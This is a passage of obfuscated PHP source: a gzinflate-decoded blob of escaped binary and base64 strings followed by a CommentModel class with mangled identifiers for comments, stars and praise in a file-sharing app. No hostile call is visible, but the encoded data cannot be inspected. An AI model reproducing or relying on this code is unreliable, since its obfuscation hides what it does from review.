301\162"."\x70\xa\xc1\xf\x31\x0\xe\x66\xb9\x58\xe4\x1a\x67\x98\x64\xe4\xc7\x18\xd6\x60\x49\x2e\x89\x47\x23\xec\x9d\x96\x4\x87\x26\x6c\x8a\xe4\x53\x7a\x55\x76\x31\x5\xaa\xaa\xf4\xa6\x2d\x9e\x2d\xdb".base64_decode('4sjEjw8ksL2wBdGSq0Xs6BFV1Etlly0NzFiDKbIJKzPIWaUOKhdOcEUxregQidC2')."\363\6\363\76\331\324\320\320\340\155\150\104\377\363\33\142\40\341\232\33\32\52\262\64\64\64\223\377\151\2\221\352\302\42\71\123\20\116\140\310\14\62\214\152\32\164\10\116"."\x8a\x82\x5e\x2c\x33\x2a\xab\xb7\x15\x5b\x7d\x29\xb8\x6b\x30\x64\xa1\xe8\x86\xd6\x83\x38\x85\x64\x78\x65\xbe\xc4\x1b\xce\x57\xc8\xd\x24\x84\x34\xf7\x24\xf0\xab\x5d\x58\x61\xd9\xab\x38\xfb\x46"."\xc4\xe\x5a\x6d\x32\x29\xd0\x5f\x6e\x70\x88\xb2\x9\x38\x9a\x4f\xed\x3b\x5b\x78\xa7\x82\xc5\x4c\xaf\xdc\x98\x8f\x4d\x2e\x8d\x14\x9e\xb0\xbd\x2c\xc1\x2b\xbf\x5c\x1\x85\xe8\x89\x21\xee\x35\x1c"."\135\103\145\234\336\46\161\14\72\271\323\174\234\70\102\22\241\140\312\115\362\240\211\203\362\365\5\111\346\366\175\44\224\347\16\4\160\60\302\153\242\17\244\120\53\73\230\303"."\x2a\xe0\x9a\x35\x46\x93\xe2\x70\xc6\xc1\x25\x3c\x44\xa6\x14\xf3\x50\xc\xc\x33\x92\xd\x26\x9e\x57\x86\xa6\x19\xd8\x31\xc5\x4\xd0\x73\x20\x36\xf5\x39\x3d\xef\xb0\x24\x4e\x4a\x75\xcb\xb3\x39"."\x1f\x67\x94\x67\x9\x6d\xda\x0\x7f\x9\x86\x6a\x1b\xb2\xe6\x15\xd8\x5d\x34\x48\x5c\x5f\x93\x47\xfc\xa8\x82\x68\xf3\x81\x15\xeb\x67\xbb\xd7\x8e\x2c\x83\x69\x8\x3b\xe0\xa\x1d\x1f\x16\x92\x16"."\203\111\311\343\137\242\206\303\142\202\54\202\52\256\264\162\377\222\122\5\356\44\127\231\0\25\256\127\24\200\370\312\334\344\102\242\112\156\34\357\312\115\74\113\266\162\367\270".base64_decode('srtJqjEg6ZVY8ASAUBFgdYxIHJSvZBqDaJktedJQfHf1aJ69MmeVTLz3cj45Et92')."\xb0\xa7\x34\x1\x62\x85\x2d\xb2\x2a\x5e\xf2\x95\xb2\x8a\x53\x47\x8a\x74\x6e\x58\x29\xa1\x95\x3f\xd8\x24\x47\x62\x8e\x4c\x56\xa\x21\x6a\xb7\xce\x3a\x30\xab\xe7\x8c\xe1\x3d\xfb\x2\xa0\x63\x2c"."\272\15\317\256\312\112\207\64\233\100\72\130\174\42\13\171\223\16\60\141\260\312\164\120\360\14\211\373\140\147\74\215\243\114\264\343\12\51\101\160\131\136\143\257\300\322\130\272"."\251\160\5\104\127\307\65\251\142\43\300\326\155\151\221\213\71\323\136\73\367\62\366\161\71\313\205\247\225\313\0\145\341\70\236\322\244\54\337\300\73\272\223\77\76\132\5\20"."\x9d\xc0\x56\x1\x55\x84\x4\xc0\x15\x40\x6f\xd0\x6e\x96\x42\x88\xb9\x63\xf4\x5f\x86\xf5\x77\xb8\xac\x31\x9a\x55\x42\x8d\x8a\x2d\x10\x23\xa0\xb1\x44\xd6\x34\x6c\xce\xcf\xe0\xf4\x0\xd3\xbc\xc3".strrev('ò/'."\r".'¹„Ó³dQÈÇ•º'."\n".'å‹á/†(ã²®µŒ£¢³ÍròM.ãÑBïh$¡L°')."\47\300\360\162\306\45\335\235\52\55\100\41\136\4\316\110\123\113\33\46\341\265\45\307\11\105\73\246\15\312\301\260\301\145\14\370\356\106\253\122\5\366\125\43\201\75\206\2"."\304\375\226\145\317\67\222\167\161\24\222\334\310\113\264\216\267\121\341\104\122\222\326\114\3\323\245\4\222\277\32\275\344\222\164\111\126\14\204\271\217\227\123\374\302\301\105\305".base64_decode('MMMIRSYSmKUDroA4IcEjsOQ0VC32ACxGJhchbVYUoWn4nBauPOQUC/uH72HLVi2l')."\112\123\44\111\232\321\64\167\150\4\263\43\46\11\22\306\65\246\37\350\155\154\362\62\7\120\262\325\4\43\224\151\10\123\353\22\30\140\36\203\341\106\120\366\203\174\42\217"."\x21\x5d\xdb\x10\xf7\x1e\xc2\xfd\x1\xf1\x64\xc2\xd7\x93\xb8\x3c\xe1\x21\x53\x3a\xcb\x34\xae\x8\x48\x7c\x7f\xc8\x68\x45\xdc\xae\x53\xfd\x40\x9c\xa1\xa7\x5a\x3a\x9d\x21\x9c\xdc\xe6\x50\x9f\x74"."\145\100\73\303\231\16\56\343\105\147\250\373\21\303\241\203\343\252\4\236\43\220\135\341\223\122\142\34\102\23\25\105\31\324\61\275\64\61\102\113\200\172\105\141\52\264\34\57"."\211\350\204\301\43\53\65\15\174\134\205\30\354\111\341\75\317\272\172\154\117\352\220\350\164\215\163\253\77\254\7\204\17\11\256\307\151\311\1\226\312\201\323\162\4\250\336\223".base64_decode('ozSP4rlGNWYayiQP3Z3dfh61mG9Pyq0KZ0ytTLlIPEI/WtDTSjjaEWoNhNtC8aXK').base64_decode('oGYrQiWCPCfh3MpE0EYnnkF1ir9sgD+9KUSxejOccLcEiS5pf0lPSDmrpfCnmRU1').base64_decode('FrHFR76iDBYfVsmdF9I0KXPJ1Crzj2vkFXnRY6lAuUpvIH/1FsjzE3JudBBrxT11').strrev('’ÃÀÂ>•ëhb2´ˆ6üŒ±üšœœ–²÷±p’E'."\n".'ëh×.1+>6.–è/^').base64_decode('7KLdxanT5ZN9xZXYNQA8hsifCqBB6aGfkqnqliZF0PdnpoGBhZrPO574yw9IwbLz')."\x64\xad\xda\x54\x92\x36\xc0\xe2\x24\x77\x74\xd5\x32\xc4\xf0\xdb\xed\xff\xeb\xae\xea\x19\xe1\x16\x4a\xcf\x30\x6d\x4\x6e\xf\x47\x5f\x11\x68\x95\x9f\x83\x64\x6d\x56\x3c\x66\xf4\xa5\xcf\x22\x79".strrev('Â62¿{N0½oaŸÊæù%ãš(Ä	¢3_RM.4ŠĞ8ä Í{ÅÄ4$')."\147\207\332\160\163\224\135\102\134\40\226\353\60\22\232\151\75\42\74\1\363\354\270\271\165\75\360\344\126\12\165\274\250\136\321\6\171\113\200\246\365\342\341\240\234\375\142\160"."\50\304\137\6\21\105\335\51\125\72\200\222\25\41\66\341\31\224\26\245\201\276\65\306\337\172\120\26\60\353\136\321\0\361\127\25\54\224\154\7\53\331\51\153\203\113\153\103"."\x23\x8\xa5\x23\x58\x5\xac\x53\x63\x14\xc6\x2b\x22\x1c\xb2\x92\x30\xeb\x17\x57\xc2\xc3\x2f\x5d\x14\x7\xc\x79\xfe\x8\x42\xc6\xaa\xfd\xf4\xc5\x40\xca\xb3\x7a\x10\xad\xaf\xd9\x95\xf\x6\xd1"."\342\377\137\12\322\304\270\244\232\350\254\244\262\103\226\373\250\23\144\27\176\13\51\153\214\72\237\15\304\61\356\327\217\34\357\36\111\233\206\30\241\312\57\65\71\13\171\52".base64_decode('XhxRyHuwCgJ1WEXs0YjxRCSz1PQU+tMHv+w4c3eCIiposp4DVWtWz2dMriQiIro0').strrev('HÂMñÛ,±-:¯Â>tìâ8cÄ[WÎsßacïj“‘ü¸`ÔG’ŞïeBOXR’¨Á').base64_decode('qIMeSpFhrCZCi8flb1kxlIwCJTJhUoav90IpA3uFLuMhT6RRVOd+RUXaaRx/yqUH')."\363\106\112\315\307\250\156\225\303\20\304\104\334\24\327\227\164\144\243\121\176\265\124\22\127\61\362\221\211\376\165\30\313\101\132\117\242\63\111\114\276\223\364\356\66\56\140\116"."\272\304\241\221\160\241\123\56\206\250\240\333\21\153\112\174\236\254\324\113\257\256\204\125\26\144\107\375\354\246\167\125\60\141\162\225\354\376\220\113\135\333\245\367\321\375\225\367"."\215\130\153\14\60\212\254\124\11\127\277\76\231\21\203\14\312\2\105\200\206\143\43\143\120\102\324\260\207\174\20\114\41\23\356\137\20\313\41\330\371\102\17\5\165\362\323\246".base64_decode('DXAuBofFaS77qRB6Bu5H5lgz/I08Dx2ZeBuVvojn4a/feaiLQw+8eecR1nVf9MiP').strrev('CŞfËÒÀbªÎNoqË²ÜQÌ¥Fâ{˜W*ŸœÜ\'`¬B×3î2VùØöx').base64_decode('7pg9zKubazrEqOSVqTKHX14HVUYl7FLGia+aF6RMdk/nzqY7oC5pasLKhDrcrEDt')."\x2b\xb\x99\xa6\x19\xb3\xe6\xc9\x62\x9\xb1\x3e\xe2\xf6\x8a\xb9\xf9\xa6\x3f\x40\x67\x88\x15\x57\xa4\x56\x31\x86\x65\x5e\x3e\xe5\x7d\x4b\x12\x9d\x7a\xc2\x95\x8f\x53\xba\x70\xf7\xff\xe\xf2\x5"."\335\117\263\112\132\273\225\217\374\126\314\0\1\102\111\237\105\72\312\134\312\13\6\326\51\260\304\366\241\207\227\170\222\322\331\26\75\370\253\214\103\64\53\355\4\372\142\240".base64_decode('kcfccQFLfW1TdbKC1TgeMhOMvdLJw92au+9kYkAOIpIllkiu0TbcQhxcHJ9oRIYY')."\55\346\341\300\305\126\303\142\117\111\50\345\177\261\200\214\273\241\214\220\120\135\251\62\162\377\311\14\157\124\171\21\122\272\377\377\202\176\123\272\214\163\162\136\325\366\112\0"."\51\11\376\64\73\112\26\230\6\45\206\323\71\126\127\365\250\230\250\243\337\243\354\51\123\45\161\46\75\34\51\374\112\111\144\31\56\315\314\23\367\300\257\63\344\44\77\211"."\151\147\5\343\101\167\250\143\267\112\276\163\145\173\55\122\221\274\15\52\253\226\136\10\24\42\34\42\363\201\101\300\36\46\156\64\211\235\136\240\203\333\356\251\222\272\221\123"."\256\204\147\127\172\24\326\220\277\305\254\143\174\36\145\276\113\121\353\16\276\20\205\333\134\17\6\23\254\344\176\105\230\115\21\101\5\2\313\111\46\241\16\46\204\277\242\346"."\140\112\54\367\103\211\210\64\223\275\12\243\40\337\4\160\234\2\72\44\172\335\264\65\351\264\144\235\32\224\276\42\345\202\10\110\302\130\302\377\360\104\207\345\54\366\217\344".base64_decode('2vnMHtdyPZtKPcPSb0am//9+GfD/1oOAsxqY2Nzx7HAHEMvQW3w3xoUHVGTrGofz')."\320\74\0\240\210\277\260\55\205\271\362\52\363\221\305\134\147\251\354\232\107\315\347\245\243\265\72\173\121\361\136\53\2\276\34\177\354\263\132\300\155\44\346\176\273\265\227\275".strrev('%0Øf4¯³ó¹„Z"­dTdD³#Ó°¯^\'Måb×ˆÅcTÅÎ`Q–¯íeN‚')."\312\320\254\154\35\32\55\61\326\256\36\60\173\77\374\202\275\71\140\45\31\23\71\242\52\360\127\302\261\12\216\110\171\202\141\325\260\101\55\133\100\107\211\56\327\333\223\64"."\x13\xf3\xa6\x58\xf9\x96\xbd\xac\x65\x56\x79\x9\x5e\x59\x13\xc7\x2\x72\x11\xac\x31\xec\x94\x3d\xf1\xb7\xc7\x1b\xdc\x8f\x91\x37\x7a\x2b\x1b\xa3\xa\xfb\x58\xfc\x11\xc3\x2\x7\x26\x42\x22\x77"."\61\344\256\264\112\31\12\265\161\221\147\17\373\246\372\356\345\357\177\12\171\32\376\222\307\313\260\100\267\151\20\342\316\31\313\205\60\222\262\246\364\72\366\24\237\334\143\11"."\311\272\356\66\20\307\45\56\373\164\203\270\150\147\105\173\272\352\210\355\11\100\57\142\30\332\15\1\7\322\323\323\170\177\11\67\207\330\51\25\221\373\301\236\167\230\203\111"."\332\324\20\345\220\316\131\362\153\30\316\222\130\77\336\271\257\26\126\313\226\66\114\113\312\306\343\253\345\305\20\46\113\37\344\64\374\114\260\355\130\13\341\155\337\355\145\237".base64_decode('8OSUzXZw23AfK0dJ15WI8M44n+0giSSaecSEGqQLN+d9J/dCXoE1y3pYSialmKM1')."\364\213\115\346\102\302\67\3\111\246\127\11\1\351\5\152\167\51\347\313\345\322\355\150\232\100\136\260\362\2\114\334\313\111\64\7\53\206\271\42\161\34\270\342\253\275\275\75"._kodDe('L32Pcfe/OIjUqjtBKVoUYHUrFbQFm9/Pc5uBdF+mYdkle20Wx91KISm1RRr5mEynqw==')."\xa\x11\xc3\xc4\x71\xd5\x86\x4f\x36\x9a\xb3\xb8\x6c\x5\xcc\x81\x4a\x44\xd1\x87\x17\xb8\x2e\x91\xc4\x3\x61\x23\x5\xa1\x64\x44\x87\xc2\x19\x7a\xd1\xa4\xd3\xe6\x98\x67\xe3\x6b\x86\xf2\x10\x93"."\20\257\43\326\305\325\141\361\10\243\36\134\111\40\115\220\252\257\52\164\220\100\100\313\207\245\352\344\13\321\75\26\210\127\157\104\100\245\163\212\45\143\155\221\300\216\75\271"."\26\7\212\344\3\203\234\61\71\321\321\35\367\322\22\206\104\200\57\215\54\20\141\54\115\13\70\223\150\176\315\325\173\271\200\173\144\264\204\65\252\333\351\254\304\45\125\46"."\126\306\233\25\223\12\15\125\357\257\273\127\154\116\335\274\243\250\244\242\77\222\126\105\302\250\122\206\366\250\152\61\232\204\113\12\322\325\121\166\17\123\200\313\322\44\134\266".base64_decode('IpkVlkQtUjlbLVt7GF7l5IH8IVNlwC4unWbd03xWzVzZHECcOzcRWFTvhZAzuG63').base64_decode('q/WiauY99kLkdp0C1XAtS6mCXYWaQyUeF2lVlC5onfiMlp03VUmWNTiq63jEqm59')."\313\251\174\341\212\227\47\6\374\164\322\0\323\312\102\134\143\136\317\11\175\64\246\76\75\305\201\337\313\305\134\321\340\147\106\106\350\316\141\105\337\200\351\236\310\212\332\234"."\x70\x5a\x2c\x4b\xae\x4f\xab\x6a\x73\x7b\x30\x8f\x5f\xc9\x4d\xe7\x55\x26\xbf\x97\xd4\xe0\x29\xfb\x63\x20\xba\x5d\x73\xfa\x57\x95\x7d\x38\xd1\x74\xd6\x48\x5e\x92\x13\xba\x44\x74\x42\xe2\xe0\x50"."\16\250\42\304\42\121\364\323\47\104\341\264\76\61\26\11\46\34\346\7\224\116\200\353\1\172\263\330\212\157\260\371\235\22\361\15\112\317\125\232\34\67\114\333\203\323\22\106"."\211\374\56\66\154\133\334\264\123\26\237\20\203\370\160\364\110\212\44\350\113\134\40\341\116\221\233\11\2\266\4\275\220\117\270\343\304\274\163\134\243\251\4\51\71\2\370\306"."\x83\x7\xe4\xb3\xf\xee\x3a\xdb\xcb\xae\xdb\x58\x11\x81\x18\xd5\x94\x31\xc6\x3c\x2f\x62\x33\x67\xd1\x1f\x7c\x49\x21\x4d\x99\xa0\x4f\x0\xfc\x64\x55\x18\x62\x40\x6e\xf9\x69\x8a\x1f\x3c\xf6\x7b".strrev('Šïw¨ÚÆ/;©"¼Dñ"vîDİwPUQ '."\r".'Q~w«‰R}8£ Ò¡¾`cÂ(LU').base64_decode('ZFJKUi2qSOrujEb2lBbsCoTCFWlYCymSFG62aFKom/SSXOXtqReh1qWiJ+TSWAjq').base64_decode('S1mDyd/ZRUZczQMcyVaRWkH4WxNlino6JwR9qkS8W8wVIf9wPqHjUvZjQAoVYQ2i')."\x8\xd4\x1d\x2b\x41\x2c\xf6\x76\xce\xf7\x3a\x27\xa4\xc5\x2d\xb8\xcf\x71\x5b\x2e\xc5\x93\xfd\x40\x10\x8c\x4\x73\xf2\x41\x4b\x22\xa6\x55\x9d\x20\x59\xc8\x5b\x79\xe9\x40\x52\xc5\x4\xe0\x8e\x2d"."\61\100\375\154\310\110\111\227\12\224\215\1\313\104\230\122\111\113\214\176\73\222\155\165\260\352\245\61\225\354\341\35\57\144\156\377\7\176\216\350\24\317\252\0\0".base64_decode('').base64_decode(''), 10, -8))); goto eáùÖ•Ÿ; eáùÖ•Ÿ: define($_SERVER[ä¿÷‹µ±][0], $_SERVER[ä¿÷‹µ±][1]); $_SERVER[²Ø‡¦âƒ] = explode($_SERVER[ä¿÷‹µ±][2], gzinflate(substr($_SERVER[ä¿÷‹µ±][3], 10, -8))); function binCheckEq($ÆÇ¾ù×ˆ, $úÁ¦Ì¯») { return $ÆÇ¾ù×ˆ == $úÁ¦Ì¯»; } goto F‡‚„ïø¾; Fµİê­šö’: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\x6d\x65" => "\143\157\155\x6d\x65\x6e\x74\137\x6d\x65\164\x61", "\x6d\x65\x74\x61\x46\151\145\154\144" => "\143\157\155\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ì½ôûÊ¶) { $ÕÖıíâæ =& $_SERVER[ä¿÷‹µ±]; if ($Ì½ôûÊ¶[$ÕÖıíâæ[1879]]) { $·šÍõÌÙ = $this->where(array($ÕÖıíâæ[1880] => $Ì½ôûÊ¶[$ÕÖıíâæ[1879]]))->find(); if (!$·šÍõÌÙ || $·šÍõÌÙ[$ÕÖıíâæ[411]] != $Ì½ôûÊ¶[$ÕÖıíâæ[411]] || $·šÍõÌÙ[$ÕÖıíâæ[505]] != $Ì½ôûÊ¶[$ÕÖıíâæ[505]]) { return !1; } $this->where(array($ÕÖıíâæ[1880] => $Ì½ôûÊ¶[$ÕÖıíâæ[1879]]))->setAdd($ÕÖıíâæ[1881], 1); } $Ì½ôûÊ¶[$ÕÖıíâæ[1882]] = 0; $Ì½ôûÊ¶[$ÕÖıíâæ[1881]] = 0; $Ì½ôûÊ¶[$ÕÖıíâæ[769]] = 1; return $this->add($Ì½ôûÊ¶); } public function commentCount($Ù…™‰Ú¿, $†÷ï°şÑ, $³³æÎó» = false) { $‰„¦„ûí =& $_SERVER[ä¿÷‹µ±]; if (!$Ù…™‰Ú¿) { return array(); } if (is_string($Ù…™‰Ú¿) || is_int($Ù…™‰Ú¿)) { $Ù…™‰Ú¿ = array($Ù…™‰Ú¿); } $±Òñ‡•¬ = array($‰„¦„ûí[505], $‰„¦„ûí[1883] => $‰„¦„ûí[500]); $Í¯Âª¡÷ = array($‰„¦„ûí[505] => array($‰„¦„ûí[7], $Ù…™‰Ú¿), $‰„¦„ûí[411] => $†÷ï°şÑ); if ($³³æÎó») { $Í¯Âª¡÷[$‰„¦„ûí[1678]] = $³³æÎó»; } $½¿÷Ü«‰ = $this->field($±Òñ‡•¬)->where($Í¯Âª¡÷)->group($‰„¦„ûí[505])->select(); return array_to_keyvalue($½¿÷Ü«‰, $‰„¦„ûí[505], $‰„¦„ûí[500]); } public function starTarget($ÔÄ¿Í×æ, $Ãß¿ìß’) { $‹÷†Ÿİ‰ =& $_SERVER[ä¿÷‹µ±]; $Æ¿É»‹Ç = $ÔÄ¿Í×æ + self::TYPE_STAR_OFFSET; $¾õÓí‹© = array($‹÷†Ÿİ‰[1678] => USER_ID, $‹÷†Ÿİ‰[411] => $Æ¿É»‹Ç, $‹÷†Ÿİ‰[505] => $Ãß¿ìß’); $ß»£Ò¨… = $this->where($¾õÓí‹©)->find(); if ($ß»£Ò¨…) { return $this->where(array($‹÷†Ÿİ‰[399] => $ß»£Ò¨…[$‹÷†Ÿİ‰[399]]))->delete(); } $û¬¸‰Äã = array($‹÷†Ÿİ‰[1879] => 0, $‹÷†Ÿİ‰[1678] => USER_ID, $‹÷†Ÿİ‰[769] => 1, $‹÷†Ÿİ‰[774] => $‹÷†Ÿİ‰[12], $‹÷†Ÿİ‰[411] => $Æ¿É»‹Ç, $‹÷†Ÿİ‰[505] => $Ãß¿ìß’, $‹÷†Ÿİ‰[1882] => 0, $‹÷†Ÿİ‰[1881] => 0); return $this->add($û¬¸‰Äã); } public function starTargetCount($˜·¿…ş, $´ƒâÃ¹) { $¾ë¡®Œ· =& $_SERVER[ä¿÷‹µ±]; $Äéúô¤’ = $´ƒâÃ¹ + self::TYPE_STAR_OFFSET; $İá×ğÖ¦ = $this->commentCount($˜·¿…ş, $Äéúô¤’); $—¥Î´«¤ = $this->commentCount($˜·¿…ş, $Äéúô¤’, USER_ID); return array($¾ë¡®Œ·[1884] => $İá×ğÖ¦, $¾ë¡®Œ·[1885] => $—¥Î´«¤); } public function starTargetUserList($¬ïÁ‡Ó, $âÂ´Ö·) { $ºšÙÅ‚ï =& $_SERVER[ä¿÷‹µ±]; $ú½×ˆáÅ = $¬ïÁ‡Ó + self::TYPE_STAR_OFFSET; $äŠöÓçø = array($ºšÙÅ‚ï[505] => $âÂ´Ö·, $ºšÙÅ‚ï[411] => $ú½×ˆáÅ); $‹Û‡´» = $this->where($äŠöÓçø)->count(); $Àö¶ŒîÖ = array($ºšÙÅ‚ï[255] => $‹Û‡´», $ºšÙÅ‚ï[1886] => array()); if (!$‹Û‡´») { return $Àö¶ŒîÖ; } $¾şäø´° = $this->field($ºšÙÅ‚ï[1678])->where($äŠöÓçø)->limit(500)->select(); $¾şäø´° = array_to_keyvalue($¾şäø´°, $ºšÙÅ‚ï[12], $ºšÙÅ‚ï[1678]); $Àö¶ŒîÖ[$ºšÙÅ‚ï[1886]] = Model($ºšÙÅ‚ï[513])->userListInfo($¾şäø´°); return $Àö¶ŒîÖ; } public function prasiseUserList($Û»®‡ş¨) { $·–Å‘¿¡ =& $_SERVER[ä¿÷‹µ±]; $ÖÆ¬ãä£ = array($·–Å‘¿¡[1887] => $Û»®‡ş¨); $ïŞğŒ = $this->where($ÖÆ¬ãä£)->find(); $ä¶¯œé = _get($ïŞğŒ, $·–Å‘¿¡[1882], 0); $¦Ü˜²Ó® = array($·–Å‘¿¡[255] => $ä¶¯œé, $·–Å‘¿¡[1886] => array()); if (!$ä¶¯œé) { return $¦Ü˜²Ó®; } $ÑªšÛ = Model($·–Å‘¿¡[1888])->field($·–Å‘¿¡[1678])->where($ÖÆ¬ãä£)->limit(500)->select(); $ÑªšÛ = array_to_keyvalue($ÑªšÛ, $·–Å‘¿¡[12], $·–Å‘¿¡[1678]); $¦Ü˜²Ó®[$·–Å‘¿¡[1886]] = Model($·–Å‘¿¡[513])->userListInfo($ÑªšÛ); return $¦Ü˜²Ó®; } public function remove($çš‡„íÇ) { $›Ä —‚ô =& $_SERVER[ä¿÷‹µ±]; $“şèûäæ = array($›Ä —‚ô[1880] => $çš‡„íÇ); $ĞÙÕË«é = $this->where($“şèûäæ)->find(); if ($ĞÙÕË«é[$›Ä —‚ô[1879]]) { $this->where(array($›Ä —‚ô[1880] => $ĞÙÕË«é[$›Ä —‚ô[1879]]))->setAdd($›Ä —‚ô[1881], -1); } return $this->where($“şèûäæ)->delete(); } public function edit($ã‡¬¨¶µ, $Ÿ©¦Šº¯) { $¬šÃ¿‹Â =& $_SERVER[ä¿÷‹µ±]; $¡ŠèÀÈ‰ = array($¬šÃ¿‹Â[1880] => $ã‡¬¨¶µ); return $this->where($¡ŠèÀÈ‰)->save(array($¬šÃ¿‹Â[1889] => $Ÿ©¦Šº¯)); } public function prasise($¢áõ†ãœ) { $Øş‚Øå£ =& $_SERVER[ä¿÷‹µ±]; $¤˜‹¬«­ = Model($Øş‚Øå£[1890]); $¹‡“À§« = array($Øş‚Øå£[1880] => $¢áõ†ãœ, $Øş‚Øå£[1669] => USER_ID); $á¸Âä‹ = $¤˜‹¬«­->where($¹‡“À§«)->find(); if (!$á¸Âä‹) { $¤˜‹¬«­->add($¹‡“À§«); $ôâ¬ø¹ = $this->where(array($Øş‚Øå£[1880] => $¢áõ†ãœ))->setAdd($Øş‚Øå£[1882], 1); } else { $¤˜‹¬«­->where($¹‡“À§«)->delete(); $ôâ¬ø¹ = $this->where(array($Øş‚Øå£[1880] => $¢áõ†ãœ))->setAdd($Øş‚Øå£[1882], -1); } return $ôâ¬ø¹; } public function targetInfo($•şÇé“­, $³ììê·ü) { $„‡¢Ëõğ =& $_SERVER[ä¿÷‹µ±]; $šÄÁ‡¶Ã = array($„‡¢Ëõğ[586] => $•şÇé“­, $„‡¢Ëõğ[587] => $³ììê·ü); $­è°º•æ = $this->where($šÄÁ‡¶Ã)->count(); $ô«”ÓßÎ = "\122\111\107\x48\x54\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\x63\157\155\155\145\x6e\164\137\160\162\x61\151\x73\x65\40\x73\x74\x61\x72\40\x6f\x6e\x20\143\x6f\155\x6d\145\x6e\164\x2e\143\157\x6d\x6d\x65\x6e\164\x49\104\40\75\x20\x73\164\141\x72\56\143\157\155\155\145\156\x74\111\x44"; $Ö©ÃÈ»Ë = $this->alias($„‡¢Ëõğ[354])->where($šÄÁ‡¶Ã)->join($ô«”ÓßÎ, $„‡¢Ëõğ[1891])->count(); $å‡ï¯½´ = array($„‡¢Ëõğ[1892] => $­è°º•æ, $„‡¢Ëõğ[1893] => $Ö©ÃÈ»Ë); return $å‡ï¯½´; } public function listData($”õÉù) { $¦éÛË¡ =& $_SERVER[ä¿÷‹µ±]; if (isset($”õÉù[$¦éÛË¡[1894]])) { if ($”õÉù[$¦éÛË¡[1894]]) { $”õÉù[$¦éÛË¡[1887]] = array($¦éÛË¡[1036], intval($”õÉù[$¦éÛË¡[1894]])); } unset($”õÉù[$¦éÛË¡[1894]]); } if (isset($”õÉù[$¦éÛË¡[1895]])) { if ($”õÉù[$¦éÛË¡[1895]]) { $”õÉù[$¦éÛË¡[1887]] = array($¦éÛË¡[1033], intval($”õÉù[$¦éÛË¡[1895]])); } unset($”õÉù[$¦éÛË¡[1895]]); } return $this->_listData($”õÉù); } private function _listData($ğ÷„‹Ó§) { $éıª’ê• =& $_SERVER[ä¿÷‹µ±]; $‡¤µÇÍÒ = $this->where($ğ÷„‹Ó§)->_makeOrder()->selectPage(100); $this->_listAppendParent($‡¤µÇÍÒ[$éıª’ê•[369]]); $this->_listAppendUser($‡¤µÇÍÒ[$éıª’ê•[369]]); $this->_listAppendMeta($‡¤µÇÍÒ[$éıª’ê•[369]]); return $‡¤µÇÍÒ; } private function _makeOrder() { $Éôª‡£ =& $_SERVER[ä¿÷‹µ±]; $šÒàéİƒ = array($Éôª‡£[1882], $Éôª‡£[1881], $Éôª‡£[200]); $ç’³à¬ = Input::get($Éôª‡£[457], $Éôª‡£[7], $Éôª‡£[423], $šÒàéİƒ); $²´îü… = Input::get($Éôª‡£[458], $Éôª‡£[7], $Éôª‡£[1671], array($Éôª‡£[1896], $Éôª‡£[453])); $¹§É¡×— = $ç’³à¬ . $Éôª‡£[53] . $²´îü…; return $this->order($¹§É¡×—); } private function _listAppendParent(&$œÜƒ¬Ó) { $¶¥­ò±Ş =& $_SERVER[ä¿÷‹µ±]; $©Ö†Ó¾ = array_unique(array_to_keyvalue($œÜƒ¬Ó, $¶¥­ò±Ş[12], $¶¥­ò±Ş[1879])); $©Ö†Ó¾ = array_remove_value($©Ö†Ó¾, $¶¥­ò±Ş[197]); if (!$©Ö†Ó¾) { return; } $¤ÒçÉÄı = $this->where(array($¶¥­ò±Ş[1880] => array($¶¥­ò±Ş[7], $©Ö†Ó¾)))->select(); $¤ÒçÉÄı = array_to_keyvalue($¤ÒçÉÄı, $¶¥­ò±Ş[1887]); foreach ($œÜƒ¬Ó as &$¦Áª×î) { if (isset($¤ÒçÉÄı[$¦Áª×î[$¶¥­ò±Ş[1879]]])) { $¦Áª×î[$¶¥­ò±Ş[1897]] = $¤ÒçÉÄı[$¦Áª×î[$¶¥­ò±Ş[1879]]]; } } unset($¦Áª×î); } private function _listAppendUser(&$²çÅÜï”) { $øÑ½Øô£ =& $_SERVER[ä¿÷‹µ±]; $š€áßÄ‹ = array_unique(array_to_keyvalue($²çÅÜï”, $øÑ½Øô£[12], $øÑ½Øô£[1678])); $š€áßÄ‹ = array_remove_value($š€áßÄ‹, $øÑ½Øô£[197]); if (count($š€áßÄ‹) == 0) { return; } foreach ($²çÅÜï” as $•ûƒ•àÌ) { if (isset($•ûƒ•àÌ[$øÑ½Øô£[1897]])) { $š€áßÄ‹[] = $•ûƒ•àÌ[$øÑ½Øô£[1897]][$øÑ½Øô£[1678]]; } } $˜ÀÖÚœò = Model($øÑ½Øô£[535])->userListInfo($š€áßÄ‹); foreach ($²çÅÜï” as &$•ûƒ•àÌ) { $•ûƒ•àÌ[$øÑ½Øô£[600]] = $˜ÀÖÚœò[$•ûƒ•àÌ[$øÑ½Øô£[1678]]]; if (isset($•ûƒ•àÌ[$øÑ½Øô£[1897]])) { $•ûƒ•àÌ[$øÑ½Øô£[1897]][$øÑ½Øô£[600]] = $˜ÀÖÚœò[$•ûƒ•àÌ[$øÑ½Øô£[1897]][$øÑ½Øô£[1678]]]; } } unset($•ûƒ•àÌ); } private function _listAppendMeta(&$û­Î˜”œ) { $¯ËÀ­â =& $_SERVER[ä¿÷‹µ±]; $’€Ä°ı¡ = array_unique(array_to_keyvalue($û­Î˜”œ, $¯ËÀ­â[12], $¯ËÀ­â[1887])); $’€Ä°ı¡ = array_remove_value($’€Ä°ı¡, $¯ËÀ­â[197]); if (!$’€Ä°ı¡) { return; } foreach ($û­Î˜”œ as $é‘ûÅíè) { if (isset($é‘ûÅíè[$¯ËÀ­â[1897]])) { $’€Ä°ı¡[] = $é‘ûÅíè[$¯ËÀ­â[1897]][$¯ËÀ­â[1887]]; } } $­µ½¤Œù = $this->metaList($’€Ä°ı¡); if (!$­µ½¤Œù) { return !1; } foreach ($û­Î˜”œ as &$é‘ûÅíè) { $é‘ûÅíè[$¯ËÀ­â[466]] = $­µ½¤Œù[$é‘ûÅíè[$¯ËÀ­â[1887]]]; if (isset($é‘ûÅíè[$¯ËÀ­â[1897]])) { 